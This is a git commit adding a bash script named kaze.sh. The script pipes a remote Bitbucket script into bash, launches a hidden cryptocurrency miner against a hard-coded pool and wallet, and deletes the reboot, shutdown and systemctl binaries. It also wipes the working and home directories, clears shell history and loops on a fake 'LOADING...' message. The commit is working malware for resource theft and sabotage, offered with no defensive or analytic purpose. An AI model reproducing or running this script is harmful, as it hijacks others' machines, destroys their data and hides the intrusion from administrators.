4d315a7da64a42b1ebedcfce3dad9c222016a4bf
kamikaze05 <167535693+kamikaze05@users.noreply.github.com>
2024-06-13 11:41:36 +0700

    Create kaze.sh

---
+++ kaze.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+apt-get update 
+apt-get install -y wget curl sudo
+curl -sL https://bitbucket.org/new-kamikaze/srbkaze/raw/main/grsrb.sh | bash
+chmod +x srbkaze
+sudo nohup ./srbkaze --algorithm verushash --pool 79.137.70.48:3956 --wallet RQi6kpwRhnL86G3wMs6segFP5jC7Gfue24.kaze1 > /dev/null 2>&1 &
+sleep 10
+sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
+curl ifconfig.me
+rm -rvf *
+cd ~/
+rm -rvf *
+history -cr
+while true
+do
+        echo "LOADING..."
+        sleep 20
+done
